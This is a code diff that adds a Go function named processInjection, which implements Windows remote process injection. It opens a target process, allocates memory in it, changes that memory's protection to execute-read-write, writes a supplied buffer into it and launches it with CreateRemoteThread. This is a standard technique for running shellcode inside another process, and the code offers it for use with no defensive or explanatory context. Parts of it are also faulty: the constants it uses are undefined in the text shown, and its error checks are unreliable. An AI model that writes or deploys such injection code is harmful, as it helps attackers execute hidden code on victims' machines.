@@ -1,0 +1,77 @@
+package main
+
+import (
+	"fmt"
+	"syscall"
+	"unsafe"
+)
+
+func processInjection(procId uintptr, buf *byte, size uintptr) {
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+
+	procOpenProcess := kernel32.NewProc("OpenProcess")
+	procVirtualAlloc := kernel32.NewProc("VirtualAllocEx")
+	procVirtualProtect := kernel32.NewProc("VirtualProtectEx")
+	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
+
+	hProcess, _, _ := procOpenProcess.Call(PROCESS_VM_WRITE|PROCESS_VM_OPERATION,
+		0,
+		procId,
+	)
+	fmt.Println(hProcess)
+
+	addr, _, err := procVirtualAlloc.Call(
+		hProcess,
+		0,
+		size,
+		MEM_COMMIT|MEM_RESERVE,
+		syscall.PAGE_READONLY,
+	)
+	if err != nil {
+		fmt.Println("Error:", err, addr)
+	}
+	oldProtect := uint32(0)
+
+	ret, _, err1 := procVirtualProtect.Call(
+		hProcess,
+		addr,
+		size,
+		uintptr(syscall.PAGE_EXECUTE_READWRITE),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+
+	if err1 != nil {
+		fmt.Println("Error:", err, ret)
+	}
+
+	var bytesWritten uintptr
+	fmt.Println("buffer size:", size)
+
+	ret2, _, err := procWriteProcessMemory.Call(
+		uintptr(hProcess), // handle to procId
+		addr,
+		uintptr(unsafe.Pointer(buf)), // source buffer
+		size,                         // size
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+
+	if err != nil {
+		fmt.Println("Error WriteProcessMemory:", err, ret2)
+	}
+
+	param := uintptr(0)
+	threadId := uintptr(0)
+
+	handle, _, _ := procCreateRemoteThread.Call(
+		hProcess,
+		0,
+		0,
+		addr,
+		param,
+		0,
+		uintptr(unsafe.Pointer(&threadId)),
+	)
+
+	fmt.Println(handle)
+}
